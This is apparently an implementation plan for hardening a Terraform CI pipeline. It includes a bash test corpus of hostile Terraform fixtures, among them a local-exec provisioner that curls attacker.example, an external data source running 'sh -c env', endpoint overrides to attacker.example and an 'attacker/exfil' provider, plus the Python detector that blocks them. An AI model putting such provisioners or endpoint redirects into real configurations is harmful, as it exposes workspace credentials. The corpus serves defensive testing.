#!/usr/bin/env bash
# Tests for scripts/check-plan-time-exec.py against temp trees (attack corpus).
#   bash scripts/tests/test-check-plan-time-exec.sh   (make test-scripts)
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SCRIPT="${REPO_ROOT}/scripts/check-plan-time-exec.py"
workdir="$(mktemp -d)"
trap 'rm -rf "${workdir}"' EXIT

failures=0
ok() { printf '  ok   %s\n' "$1"; }
bad() { failures=$((failures + 1)); printf '  FAIL %s\n' "$1" >&2; }

# case_tree <name> <relative file> <content>: one file in an otherwise empty tree.
case_tree() {
  local t="${workdir}/$1"
  mkdir -p "${t}/$(dirname "$2")"
  printf '%s\n' "$3" >"${t}/$2"
  echo "${t}"
}

# expect_rc <label> <rc> <tree>
expect_rc() {
  local rc=0
  PLAN_EXEC_ROOT="$3" python3 "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
  if [ "${rc}" -eq "$2" ]; then ok "$1"; else bad "$1 (rc=${rc}, want $2)"; cat "${workdir}/out" >&2; fi
}

expect_rc "clean module passes" 0 "$(case_tree clean modules/a/main.tf 'resource "aws_s3_bucket" "b" {
  bucket = "x"
}')"
expect_rc "bare-label provisioner fails" 1 "$(case_tree bare modules/a/main.tf 'resource terraform_data x {
  provisioner local-exec {
    command = "curl https://attacker.example"
  }
}')"
expect_rc "quoted provisioner fails" 1 "$(case_tree quoted envs/r/main.tf 'resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = "id"
  }
}')"
expect_rc "removed-block destroy provisioner fails" 1 "$(case_tree removed envs/r/main.tf 'removed {
  from = terraform_data.z
  provisioner "local-exec" {
    when    = destroy
    command = "id"
  }
}')"
expect_rc "tf.json provisioner fails" 1 "$(case_tree json modules/a/main.tf.json '{"resource": {"terraform_data": {"x": {"provisioner": [{"local-exec": {"command": "id"}}]}}}}')"
expect_rc "tf.json external data fails" 1 "$(case_tree jsondata modules/a/x.tf.json '{"data": {"external": {"x": {"program": ["sh", "-c", "env"]}}}}')"
expect_rc "bare-label external data fails" 1 "$(case_tree ext modules/a/main.tf 'data external x {
  program = ["sh", "-c", "env"]
}')"
expect_rc "check-scoped http data fails" 1 "$(case_tree check modules/a/main.tf 'check "c" {
  data "http" "y" {
    url = "https://attacker.example"
  }
  assert {
    condition     = true
    error_message = "x"
  }
}')"
expect_rc "registry-qualified external provider fails" 1 "$(case_tree fq modules/a/versions.tf 'terraform {
  required_providers {
    e = { source = "registry.terraform.io/hashicorp/external" }
  }
}')"
expect_rc "mixed-case qualified source fails" 1 "$(case_tree mixed modules/a/versions.tf 'terraform {
  required_providers {
    e = { source = "Registry.Terraform.IO/HashiCorp/External" }
  }
}')"
expect_rc "third-party provider fails" 1 "$(case_tree third modules/a/versions.tf 'terraform {
  required_providers {
    x = { source = "attacker/exfil" }
  }
}')"
expect_rc "version-only implied provider fails" 1 "$(case_tree implied modules/a/versions.tf 'terraform {
  required_providers {
    http = "~> 3.0"
  }
}')"
expect_rc "allowed qualified provider passes" 0 "$(case_tree okfq modules/a/versions.tf 'terraform {
  required_providers {
    aws = { source = "registry.terraform.io/hashicorp/aws", version = ">= 6.46.0, < 7.0.0" }
  }
}')"
expect_rc "unlisted resource type prefix fails" 1 "$(case_tree prefix modules/a/main.tf 'resource "dns_a_record_set" "x" {
  name = "x"
}')"
expect_rc "aws endpoints override fails" 1 "$(case_tree endpoints envs/r/providers.tf 'provider "aws" {
  endpoints {
    sts = "https://attacker.example"
  }
}')"
expect_rc "google custom endpoint fails" 1 "$(case_tree gce envs/r/providers.tf 'provider "google" {
  secret_manager_custom_endpoint = "https://attacker.example/"
}')"
expect_rc "tfe hostname fails" 1 "$(case_tree tfeh envs/r/providers.tf 'provider "tfe" {
  hostname = "attacker.example"
}')"
expect_rc "fips switch passes" 0 "$(case_tree fips envs/r/providers.tf 'provider "aws" {
  use_fips_endpoint = true
}')"
expect_rc "git module source fails" 1 "$(case_tree gitmod envs/r/main.tf 'module "m" {
  source = "git::https://attacker.example/x.git//supabase/vault-secrets"
}')"
expect_rc "own release module passes" 0 "$(case_tree ownmod examples/r/main.tf 'module "m" {
  source = "git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0"
}')"
expect_rc "allowlisted file keeps its provisioner" 0 "$(case_tree allow modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
  provisioner "local-exec" {
    command = "npm ci"
  }
}')"
expect_rc "look-alike path is not allowlisted" 1 "$(case_tree look modules/evil/supabase/vault-secrets/main.tf 'resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = "id"
  }
}')"
expect_rc "unparseable file fails closed" 1 "$(case_tree broken modules/a/main.tf 'resource "x" {')"
expect_rc ".terraform is skipped" 0 "$(case_tree dotterraform modules/a/.terraform/modules/m/main.tf 'resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = "id"
  }
}')"

if [ "${failures}" -ne 0 ]; then echo "${failures} failure(s)" >&2; exit 1; fi
echo "check-plan-time-exec: all cases pass"
```

- [ ] **Step 3: Run and confirm failure**

```bash
python3 -m pip install --user --no-deps --require-hashes -r .github/requirements/hcl2.txt
bash scripts/tests/test-check-plan-time-exec.sh
```

Expected: every case FAILS with `python3: can't open file '.../scripts/check-plan-time-exec.py'` (rc 2).

- [ ] **Step 4: Implement the checker**

Create `scripts/check-plan-time-exec.py`:

```python
#!/usr/bin/env python3
"""Pre-plan gate: no plan/apply-time code execution and no credential redirection.

A plan runs with the workspace's credentials and environment variables
(TFE_TOKEN, SUPABASE_ACCESS_TOKEN, the cloud plan identity). This check parses
every *.tf (python-hcl2) and *.tf.json (json) file under modules, envs,
examples, templates and tests, and fails on:
  - any provisioner (resource, removed or import block) outside PROVISIONER_ALLOW;
  - a data "external" / data "http" block, at the top level or inside a check;
  - a required_providers source (or an implied one) not in ALLOWED_PROVIDER_SOURCES;
  - a resource/data/ephemeral type whose provider prefix is not allowed;
  - an endpoint, hostname or proxy override in a provider block;
  - a module source that is neither local nor this repo's release-pinned source;
  - a file that does not parse (fail closed).
The OPA policy policies/opa/no_plan_time_code_execution.rego mirrors the
provider lists; OPA runs after the plan, so this check is the gate.

PLAN_EXEC_ROOT overrides the repository root (tests).
"""
from __future__ import annotations

import json
import os
import re
import sys
from pathlib import Path

try:
    import hcl2
except ImportError:  # fail closed with the install hint
    sys.stderr.write(
        "check-plan-time-exec: python-hcl2 is missing. Install the pinned version:\n"
        "  python3 -m pip install --user --no-deps --require-hashes -r .github/requirements/hcl2.txt\n"
    )
    sys.exit(2)

ROOT = Path(os.environ.get("PLAN_EXEC_ROOT") or Path(__file__).resolve().parent.parent)
SCAN_DIRS = ("modules", "envs", "examples", "templates", "tests")
PROVISIONER_ALLOW = {"modules/supabase/vault-secrets/main.tf", "tests/e2e/aws/main.tf"}
EXEC_DATA_TYPES = {"external", "http"}
ALLOWED_PROVIDER_SOURCES = {
    "hashicorp/aws", "hashicorp/google", "hashicorp/google-beta", "hashicorp/random",
    "hashicorp/null", "hashicorp/tfe", "hashicorp/archive", "hashicorp/azurerm",
    "supabase/supabase", "vercel/vercel",
}
# Type prefix -> provider local name. google-beta resources use the google_ prefix.
ALLOWED_TYPE_PREFIXES = {"aws", "google", "random", "null", "tfe", "terraform", "supabase", "vercel", "archive", "azurerm"}
ENDPOINT_KEY = re.compile(
    r"^(endpoints?|.*_custom_endpoint|.*_endpoint|hostname|base_url|api_url|custom_ca_bundle|"
    r"insecure|skip_tls_verify|https?_proxy|no_proxy|universe_domain|sts_region)$"
)
ENDPOINT_KEY_EXCEPTIONS = {"use_fips_endpoint", "use_dualstack_endpoint"}
LOCAL_MODULE = re.compile(r"^\.\.?/")
OWN_RELEASE_MODULE = re.compile(
    r"^git::https://github\.com/EdwinKassier/Ashes-Devops-Tools\.git//modules/[a-z0-9/_-]+\?ref=v[0-9]+\.[0-9]+\.[0-9]+$"
)


def blocks(value):
    """HCL gives a list of dicts per block type; JSON gives a dict or a list."""
    if isinstance(value, list):
        return [v for v in value if isinstance(v, dict)]
    if isinstance(value, dict):
        return [value]
    return []


def labelled(value):
    """Yield (label, body) pairs of a one-label block map ({label: body})."""
    for b in blocks(value):
        for label, body in b.items():
            yield str(label).strip('"'), body


def has_key(node, key) -> bool:
    if isinstance(node, dict):
        return any(k == key or has_key(v, key) for k, v in node.items())
    if isinstance(node, list):
        return any(has_key(v, key) for v in node)
    return False


def normalise_source(src: str) -> str:
    s = src.strip('"').lower()
    return s[len("registry.terraform.io/"):] if s.startswith("registry.terraform.io/") else s


def check_doc(rel: str, doc: dict) -> list[str]:
    out: list[str] = []

    if rel not in PROVISIONER_ALLOW:
        for kind in ("resource", "removed", "import"):
            if has_key(doc.get(kind, []), "provisioner"):
                out.append(f"{rel}: provisioner in a {kind} block (arbitrary commands with the workspace's credentials)")

    data_blocks = list(blocks(doc.get("data", [])))
    for _, check_body in labelled(doc.get("check", [])):
        data_blocks += blocks(check_body.get("data", [])) if isinstance(check_body, dict) else []
    for b in data_blocks:
        for dtype in b:
            dtype = str(dtype).strip('"')
            if dtype in EXEC_DATA_TYPES:
                out.append(f'{rel}: data "{dtype}" runs at plan time with the workspace\'s environment')

    for kind in ("resource", "data", "ephemeral"):
        for b in blocks(doc.get(kind, [])):
            for rtype in b:
                prefix = str(rtype).strip('"').split("_", 1)[0]
                if prefix not in ALLOWED_TYPE_PREFIXES and prefix not in EXEC_DATA_TYPES:
                    out.append(f'{rel}: {kind} type "{rtype}" belongs to provider "{prefix}", which is not allowlisted')

    for tf in blocks(doc.get("terraform", [])):
        for rp in blocks(tf.get("required_providers", [])):
            for name, spec in rp.items():
                name = str(name).strip('"')
                src = spec.get("source") if isinstance(spec, dict) else None
                full = normalise_source(src) if src else f"hashicorp/{name}"
                if full not in ALLOWED_PROVIDER_SOURCES:
                    out.append(f'{rel}: provider "{name}" source "{full}" is not allowlisted')

    for pname, body in labelled(doc.get("provider", [])):
        if isinstance(body, dict):
            for key in body:
                if ENDPOINT_KEY.match(key) and key not in ENDPOINT_KEY_EXCEPTIONS:
                    out.append(f'{rel}: provider "{pname}" sets "{key}" (endpoint or proxy override)')

    for mname, body in labelled(doc.get("module", [])):
        src = str(body.get("source", "")).strip('"') if isinstance(body, dict) else ""
        if not (LOCAL_MODULE.match(src) or OWN_RELEASE_MODULE.match(src)):
            out.append(f'{rel}: module "{mname}" source "{src}" is not local and not this repo\'s release tag')

    return out


def main() -> int:
    problems: list[str] = []
    for top in SCAN_DIRS:
        base = ROOT / top
        if not base.is_dir():
            continue
        for path in sorted(base.rglob("*")):
            if ".terraform" in path.parts or not path.is_file():
                continue
            name = path.name
            if not (name.endswith(".tf") or name.endswith(".tf.json")):
                continue
            rel = path.relative_to(ROOT).as_posix()
            try:
                with path.open(encoding="utf-8") as fh:
                    doc = json.load(fh) if name.endswith(".tf.json") else hcl2.load(fh)
            except Exception as exc:  # noqa: BLE001 - any parse error fails closed
                problems.append(f"{rel}: cannot parse ({type(exc).__name__}); fail closed")
                continue
            if isinstance(doc, dict):
                problems += check_doc(rel, doc)
    for p in problems:
        print(f"  ERROR {p}", file=sys.stderr)
    return 1 if problems else 0


if __name__ == "__main__":
    sys.exit(main())
```

Run it on the real tree first:

```bash
python3 scripts/check-plan-time-exec.py; echo "rc=$?"
```

Expected: `rc=0`. If a real file is flagged, read it. A true finding is fixed in that file in this task. A parser gap (a valid file that does not parse) is fixed in the script, never by adding the file to an allowlist.

Then replace `scripts/check-consistency.sh:170-180` (from `echo "==> No plan-time code execution` to the `[ -z "$execs" ] ||` line) with:

```bash
echo "==> No plan-time code execution, unlisted providers or endpoint overrides (HCL/JSON parse)"
# scripts/check-plan-time-exec.py parses every .tf and .tf.json file (python-hcl2,
# hash-pinned in .github/requirements/hcl2.txt). A grep missed bare labels,
# .tf.json, fully qualified sources and check-scoped data blocks.
if ! python3 scripts/check-plan-time-exec.py; then
  note "plan/apply-time code execution or credential redirection (see above)"
  fail=1
fi
```

In `.github/workflows/terraform-plan.yml`, insert before `- name: Consistency guards` (line 403):

```yaml
      # python-hcl2 for scripts/check-plan-time-exec.py, hash-locked like
      # commitizen. Regenerate after bumping .github/requirements/hcl2.in:
      #   uv pip compile --generate-hashes --universal --python-version 3.12 \
      #     .github/requirements/hcl2.in -o .github/requirements/hcl2.txt
      - name: Install HCL parser (hash-locked)
        run: python -m pip install --no-deps --require-hashes -r .github/requirements/hcl2.txt
```

In `scripts/setup.sh`, add next to the other Python tooling: `python3 -m pip install --user --no-deps --require-hashes -r .github/requirements/hcl2.txt`.

- [ ] **Step 5: Run and confirm pass**

```bash
bash scripts/tests/test-check-plan-time-exec.sh
./scripts/check-consistency.sh
make shellcheck
```

Expected: `check-plan-time-exec: all cases pass`. `check-consistency.sh` exits 0. `shellcheck` reports nothing for the new test.

- [ ] **Step 6: Docs**

- `CONTRIBUTING.md`, local prerequisites: "`python-hcl2` (hash-locked): `python3 -m pip install --user --no-deps --require-hashes -r .github/requirements/hcl2.txt`. `make consistency` fails without it."
- `CHANGELOG.md` `#### Security`: "**The plan-time execution gate parses HCL (CICD-2).** `scripts/check-plan-time-exec.py` replaces the grep: bare labels, `.tf.json`, qualified provider sources, `check`-scoped data, `removed` provisioners, endpoint overrides and remote module sources are caught."

- [ ] **Step 7: Commit**

```bash
git add scripts/check-plan-time-exec.py scripts/tests/test-check-plan-time-exec.sh scripts/check-consistency.sh scripts/setup.sh .github/requirements/hcl2.in .github/requirements/hcl2.txt .github/workflows/terraform-plan.yml CONTRIBUTING.md CHANGELOG.md
git commit -m "fix(ci): parse HCL and JSON for the plan-time execution gate"
```

---

### Task 4: SEC-7: no full saas state for viewers and backup, dedicated saas approvers

**Files:**
- Modify: `envs/tfc-admin/main.tf:743-749` (`approvers_custom_access`, new `viewer_secret_state_access`), `:826-861` (`team_project_access`), `:819-824` (`approver_projects`), `:935-965` (`terraform_data.input_contract` preconditions), new `check`
- Modify: `envs/tfc-admin/variables.tf` (new `saas_approvers_team_id`, `enable_saas_state_backup` after `state_backup_team_id`, line 485)
- Test: `envs/tfc-admin/tests/root.tftest.hcl:1101-1122` (`state_backup_team_reads_state_only`), new runs
- Docs: `docs/guides/CI_SECRETS.md` (state backup row), `.github/workflows/state-backup.yml` header comment, `UPGRADING.md`, `CHANGELOG.md`

Self-lockout check: saas applies stay confirmable by owners and by either `saas_approvers_team_id` or (when unset) `control_plane_approvers_team_id`. Viewers lose only state download on saas. The state backup of saas stops; HCP Terraform keeps every state version, so recovery stays possible.

- [ ] **Step 1: Write the failing tests**

Replace the assertion in `state_backup_team_reads_state_only` (line 1110) so the expected project set is `toset(["gcp", "aws"])` and the error message says "on every project but guardrails and saas". Append:

```hcl
run "viewers_cannot_download_saas_state" {
  command = plan

  variables {
    viewer_team_ids = ["team-viewer1"]
  }

  assert {
    condition = (
      tfe_team_project_access.this["saas/team-viewer1"].access == "custom" &&
      tfe_team_project_access.this["saas/team-viewer1"].workspace_access[0].state_versions == "none" &&
      tfe_team_project_access.this["saas/team-viewer1"].workspace_access[0].runs == "read"
    )
    error_message = "viewers must not read saas state (it holds the Supabase database password and service-role key); read-outputs would expose them too."
  }

  assert {
    condition     = tfe_team_project_access.this["gcp/team-viewer1"].access == "read"
    error_message = "viewers keep fixed read on projects without secrets in state."
  }
}

run "saas_state_backup_opt_in" {
  command = plan

  variables {
    platform_team_id         = "team-platform1"
    state_backup_team_id     = "team-backup1"
    enable_saas_state_backup = true
  }

  assert {
    condition     = contains(keys(tfe_team_project_access.this), "saas/state-backup")
    error_message = "enable_saas_state_backup = true grants the backup team state read on saas."
  }
}

run "dedicated_saas_approvers" {
  command = plan

  variables {
    platform_team_id                = "team-platform1"
    control_plane_approvers_team_id = "team-approvers1"
    saas_approvers_team_id          = "team-saasapprove1"
  }

  assert {
    condition = (
      !contains(keys(tfe_team_project_access.this), "saas/approvers") &&
      tfe_team_project_access.this["saas/saas-approvers"].team_id == "team-saasapprove1" &&
      tfe_team_project_access.this["saas/saas-approvers"].workspace_access[0].runs == "apply" &&
      contains(keys(tfe_team_project_access.this), "gcp/approvers")
    )
    error_message = "with saas_approvers_team_id set, only that team confirms saas applies; the control-plane approvers keep the other projects."
  }
}

run "saas_approvers_must_be_dedicated" {
  command = plan

  variables {
    platform_team_id       = "team-platform1"
    saas_approvers_team_id = "team-platform1"
  }

  expect_failures = [terraform_data.input_contract]
}

run "saas_without_dedicated_approvers_warns" {
  command = plan

  variables {
    control_plane_approvers_team_id = "team-approvers1"
  }

  expect_failures = [check.saas_approvers_dedicated]
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=envs/tfc-admin TERRAFORM="$TF"
```

Expected: `state_backup_team_reads_state_only` fails (saas still present). `viewers_cannot_download_saas_state` fails (access is `read`). The three runs that set new variables fail with "has not been declared". `saas_without_dedicated_approvers_warns` fails with an undeclared check.

- [ ] **Step 3: Implement**

`envs/tfc-admin/variables.tf`, after `state_backup_team_id`:

```hcl
variable "enable_saas_state_backup" {
  description = "Grant state_backup_team_id state read on the saas project too. Default false: saas-* state holds the Supabase database password and service-role key (provider limitation), and a backup copy outside HCP Terraform would hold them as well. HCP Terraform keeps every state version, so a restore stays possible."
  type        = bool
  default     = false
}

variable "saas_approvers_team_id" {
  description = "Team that confirms saas-* applies instead of control_plane_approvers_team_id. A confirmer can also queue a plan, and a plan can read the account-wide SUPABASE_ACCESS_TOKEN and VERCEL_API_TOKEN, so keep this team small. Null = control_plane_approvers_team_id (a check warns)."
  type        = string
  default     = null

  validation {
    condition     = var.saas_approvers_team_id == null || can(regex("^team-[A-Za-z0-9]+$", var.saas_approvers_team_id))
    error_message = "saas_approvers_team_id must be a TFC team ID (team-...)."
  }
}
```

`envs/tfc-admin/main.tf`, after `approvers_custom_access` (line 749):

```hcl
  # Viewers on projects whose STATE holds secrets (saas): runs and variable
  # names, never state. read-outputs would also return sensitive outputs.
  viewer_secret_state_access = {
    runs           = "read"
    variables      = "read"
    state_versions = "none"
    sentinel_mocks = "none"
    locking        = false
  }
```

In `approver_projects`, change `local.saas_projects,` to `var.saas_approvers_team_id == null ? local.saas_projects : toset([]),`.

In `team_project_access`, replace the viewer entry and the state-backup entry with:

```hcl
    {
      for pair in setproduct(tolist(local.shared_access_projects), var.viewer_team_ids) :
      "${pair[0]}/${pair[1]}" => {
        project = pair[0]
        team_id = pair[1]
        access  = contains(local.saas_projects, pair[0]) ? "custom" : "read"
        custom  = contains(local.saas_projects, pair[0]) ? local.viewer_secret_state_access : null
      }
    },
    var.saas_approvers_team_id == null ? {} : {
      for p in local.saas_projects : "${p}/saas-approvers" => {
        project = p
        team_id = var.saas_approvers_team_id
        access  = "custom"
        custom  = local.approvers_custom_access
      }
    },
```

and

```hcl
    var.state_backup_team_id == null ? {} : {
      for p in local.shared_access_projects : "${p}/state-backup" => {
        project = p
        team_id = var.state_backup_team_id
        access  = "custom"
        custom  = local.state_backup_custom_access
      } if var.enable_saas_state_backup || !contains(local.saas_projects, p)
    },
```

Add to `terraform_data.input_contract` `lifecycle`:

```hcl
    precondition {
      condition = var.saas_approvers_team_id == null || !contains(
        concat(compact([var.platform_team_id, var.security_team_id, var.tfc_admin_team_id, var.state_backup_team_id]), var.viewer_team_ids, values(var.saas_outputs_reader_team_ids)),
        coalesce(var.saas_approvers_team_id, "-"),
      )
      error_message = "saas_approvers_team_id must be a dedicated team (not platform_team_id, security_team_id, tfc_admin_team_id, state_backup_team_id, a viewer_team_ids entry or a saas_outputs_reader_team_ids value): its members can read the account-wide SaaS tokens through a plan."
    }
```

After the new `check` from Task 1, add:

```hcl
check "saas_approvers_dedicated" {
  assert {
    condition     = length(local.saas_projects) == 0 || var.saas_approvers_team_id != null || var.control_plane_approvers_team_id == null
    error_message = "saas-* applies are confirmed by control_plane_approvers_team_id. A confirmer can queue a plan and read SUPABASE_ACCESS_TOKEN and VERCEL_API_TOKEN; set saas_approvers_team_id to a smaller, dedicated team."
  }
}
```

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=envs/tfc-admin TERRAFORM="$TF"
```

Expected: all runs pass. If another existing run now trips `check.saas_approvers_dedicated` as an unexpected warning, that is fine: warnings never fail a run.

- [ ] **Step 5: Docs**

- `docs/guides/CI_SECRETS.md`: `TFC_TOKEN_STATE_BACKUP` row: add "Excludes `saas-*` unless `enable_saas_state_backup = true`."
- `.github/workflows/state-backup.yml` header comment: add "saas-* workspaces are not readable by the backup team by default (tfc-admin `enable_saas_state_backup`). Remove them from the workspace list."
- `UPGRADING.md` `## Unreleased`: "**saas state access (tfc-admin).** Viewers lose state download on saas, and the state-backup team loses saas unless `enable_saas_state_backup = true`. Remove `saas-*` from `TFC_STATE_BACKUP_WORKSPACES` or the backup job fails on them. Optional: set `saas_approvers_team_id` to a small dedicated team."
- `CHANGELOG.md` `#### Security`: "**saas state is not readable by viewers or the backup team (SEC-7)**, and saas applies can have their own approvers."

- [ ] **Step 6: Commit**

```bash
git add envs/tfc-admin docs/guides/CI_SECRETS.md .github/workflows/state-backup.yml UPGRADING.md CHANGELOG.md
git commit -m "feat(tfc-admin)!: keep saas state away from viewers and backups

BREAKING CHANGE: the state-backup team no longer reads saas-* state by default."
```

---

### Task 5: SEC-4: projects-apply may not delegate IAM-controlling data-plane roles

**Files:**
- Modify: `modules/gcp/stages/bootstrap/service_accounts.tf:241-258` (`non_delegable_folder_roles`)
- Modify: `modules/gcp/stages/organization/variables.tf:642-653`, `modules/gcp/stages/projects/variables.tf:157-168` (`non_delegable_workload_folder_roles` defaults)
- Test: `modules/gcp/stages/bootstrap/tests/plan_assertions.tftest.hcl:158-169`, `modules/gcp/stages/organization/tests/plan_assertions.tftest.hcl:466-510`
- Docs: `docs/known-gaps.md`, `UPGRADING.md`, `CHANGELOG.md`

Why: a folder IAM condition limits the role, not the member (`automation_delegation.tf:15-21`). `projects-apply` can grant itself `secretmanager.admin` on a production folder and read every secret. The repo already has the mechanism: roles in the non-delegable list are granted by `gcp-organization` directly (`automation_delegation.tf:57-110`). This task only extends the list.

Added roles (each has a `*.setIamPolicy`, `actAs`, or project-ownership effect): `roles/iam.serviceAccountUser`, `roles/secretmanager.admin`, `roles/cloudkms.admin`, `roles/storage.admin`, `roles/run.admin`, `roles/bigquery.admin`, `roles/pubsub.admin`, `roles/artifactregistry.admin`, `roles/resourcemanager.projectCreator` (the creator becomes owner of the new project). `compute.admin`, `dns.admin`, `container.admin`, `cloudsql.admin` stay delegable (no data-plane IAM); this is a known-gaps residual.

Self-lockout check: the network list (`bootstrap/variables.tf:262-284`) contains none of the added roles, so network-hub delegation is unchanged. The workload SAs keep every role; only the granter changes. Apply order matters (Step 5).

- [ ] **Step 1: Write the failing tests**

In `modules/gcp/stages/bootstrap/tests/plan_assertions.tftest.hcl`, replace the assertion at lines 160-169 with:

```hcl
  assert {
    condition = (
      contains(output.workload_folder_roles.apply, "roles/resourcemanager.projectIamAdmin") &&
      contains(output.workload_folder_roles.apply, "roles/secretmanager.admin") &&
      length(setintersection(toset(output.delegated_workload_folder_roles), toset([
        "roles/resourcemanager.projectIamAdmin", "roles/iam.serviceAccountAdmin", "roles/iam.serviceAccountKeyAdmin",
        "roles/iam.serviceAccountTokenCreator", "roles/iam.workloadIdentityPoolAdmin", "roles/iam.serviceAccountUser",
        "roles/secretmanager.admin", "roles/cloudkms.admin", "roles/storage.admin", "roles/run.admin",
        "roles/bigquery.admin", "roles/pubsub.admin", "roles/artifactregistry.admin", "roles/resourcemanager.projectCreator",
      ]))) == 0 &&
      contains(output.delegated_workload_folder_roles, "roles/compute.admin") &&
      length(setintersection(toset(output.delegated_network_folder_roles), toset(["roles/resourcemanager.projectIamAdmin", "roles/iam.serviceAccountAdmin", "roles/iam.workloadIdentityPoolAdmin"]))) == 0
    )
    error_message = "every role that controls IAM, identities, data-plane IAM or project ownership must stay out of the delegation allow-lists: projects-apply could grant it to itself."
  }
```

In `modules/gcp/stages/organization/tests/plan_assertions.tftest.hcl`, in the run that starts at line 463, change the expected values: `output.delegated_folder_iam_targets["dev"] == tolist(["roles/compute.admin"])` and the key list to `sort(["dev|apply|roles/iam.serviceAccountAdmin", "dev|apply|roles/iam.workloadIdentityPoolAdmin", "dev|apply|roles/resourcemanager.projectIamAdmin", "dev|apply|roles/run.admin"])`.

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=modules/gcp/stages/bootstrap TERRAFORM="$TF"
make test TEST_DIRS=modules/gcp/stages/organization TERRAFORM="$TF"
```

Expected: bootstrap fails "every role that controls IAM ..." (secretmanager.admin is delegated). Organization fails on `delegated_folder_iam_targets["dev"]` (still contains run.admin).

- [ ] **Step 3: Implement**

The same list goes in three places. In `modules/gcp/stages/bootstrap/service_accounts.tf`, replace `non_delegable_folder_roles` (lines 249-255) with:

```hcl
  # A delegate may grant these to itself. IAM and identity control, plus every
  # data-plane admin role that carries setIamPolicy (it could grant itself read
  # on every production secret, key, bucket or dataset), actAs, and project
  # creation (the creator owns the new project).
  non_delegable_folder_roles = [
    "roles/resourcemanager.projectIamAdmin",
    "roles/iam.serviceAccountAdmin",
    "roles/iam.serviceAccountKeyAdmin",
    "roles/iam.serviceAccountTokenCreator",
    "roles/iam.workloadIdentityPoolAdmin",
    "roles/iam.serviceAccountUser",
    "roles/secretmanager.admin",
    "roles/cloudkms.admin",
    "roles/storage.admin",
    "roles/run.admin",
    "roles/bigquery.admin",
    "roles/pubsub.admin",
    "roles/artifactregistry.admin",
    "roles/resourcemanager.projectCreator",
  ]
```

Set the same 14-item list as the `default` of `non_delegable_workload_folder_roles` in `modules/gcp/stages/organization/variables.tf:645-651` and `modules/gcp/stages/projects/variables.tf:160-166`. Add a consistency guard in `scripts/check-consistency.sh` (after the plan-time block):

```bash
echo "==> Non-delegable workload folder roles are identical in bootstrap, organization and projects"
python3 - <<'PY' || { note "non-delegable workload folder role lists differ between bootstrap, organization and projects"; fail=1; }
import re, sys
def roles(path, start):
    s = open(path, encoding="utf-8").read()
    i = s.index("[", s.index(start))
    return sorted(re.findall(r'"(roles/[^"]+)"', s[i:s.index("]", i)]))
a = roles("modules/gcp/stages/bootstrap/service_accounts.tf", "non_delegable_folder_roles = [")
b = roles("modules/gcp/stages/organization/variables.tf", 'variable "non_delegable_workload_folder_roles"')
c = roles("modules/gcp/stages/projects/variables.tf", 'variable "non_delegable_workload_folder_roles"')
sys.exit(0 if a == b == c else 1)
PY
```

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=modules/gcp/stages/bootstrap TERRAFORM="$TF"
make test TEST_DIRS=modules/gcp/stages/organization TERRAFORM="$TF"
make test TEST_DIRS=modules/gcp/stages/projects TERRAFORM="$TF"
make test TEST_DIRS=envs/gcp/organization TERRAFORM="$TF"
./scripts/check-consistency.sh
```

Expected: all pass, consistency exits 0.

- [ ] **Step 5: Docs**

- `UPGRADING.md` `## Unreleased`: "**More workload roles are granted by gcp-organization (GCP).** `iam.serviceAccountUser`, `secretmanager.admin`, `cloudkms.admin`, `storage.admin`, `run.admin`, `bigquery.admin`, `pubsub.admin`, `artifactregistry.admin` and `resourcemanager.projectCreator` move from the projects-apply delegation to direct grants. Apply in this order, with no workload applies in between: (1) `gcp-bootstrap` (new allow-list output), (2) `gcp-projects` (removes its grants of those roles; `google_folder_iam_member` is non-authoritative, so the binding disappears), (3) `gcp-organization` (adds them back as direct grants). Between (2) and (3) the workload apply SAs lack those roles."
- `docs/known-gaps.md` WS3 section: "**Delegable infrastructure roles (SEC-4 residual).** `compute.admin`, `dns.admin`, `container.admin` and `cloudsql.admin` stay delegable. A projects-apply compromise can grant itself those on an environment folder. None grants data-plane IAM."
- `CHANGELOG.md` `#### Security`: "**projects-apply cannot delegate data-plane IAM roles (SEC-4).**"

- [ ] **Step 6: Commit**

```bash
git add modules/gcp/stages scripts/check-consistency.sh docs/known-gaps.md UPGRADING.md CHANGELOG.md
git commit -m "fix(gcp)!: keep data-plane IAM roles out of the projects-apply delegation

BREAKING CHANGE: apply gcp-bootstrap, gcp-projects, then gcp-organization."
```

---

### Task 6: SEC-3: organization-apply cannot grant itself a guardrail-owner role

**Files:**
- Modify: `modules/gcp/stages/bootstrap/service_accounts.tf:276-287` (`stage_org_security_admin`), new resource `google_organization_iam_member.org_admins`
- Modify: `modules/gcp/stages/bootstrap/variables.tf` (new `organization_apply_grantable_roles`, `organization_apply_extra_grantable_roles`, `organization_admin_members`), `modules/gcp/stages/bootstrap/outputs.tf` (new output)
- Modify: `envs/gcp/bootstrap/main.tf:12-31`, `envs/gcp/bootstrap/outputs.tf:11-60` (contract key and type)
- Modify: `modules/gcp/stages/organization/main.tf:7-44` (stop granting `organizationAdmin`), new precondition resource; `modules/gcp/stages/organization/variables.tf` (new `organization_apply_grantable_roles`)
- Modify: `envs/gcp/organization/main.tf` (pass the contract key)
- Test: `modules/gcp/stages/bootstrap/tests/plan_assertions.tftest.hcl`, `modules/gcp/stages/bootstrap/tests/variables_validation.tftest.hcl`, `modules/gcp/stages/organization/tests/plan_assertions.tftest.hcl`
- Docs: `docs/known-gaps.md:281-284` (G14 residual), `UPGRADING.md`, `CHANGELOG.md`, `modules/gcp/monitoring/control-plane/variables.tf:115-118` (comment)

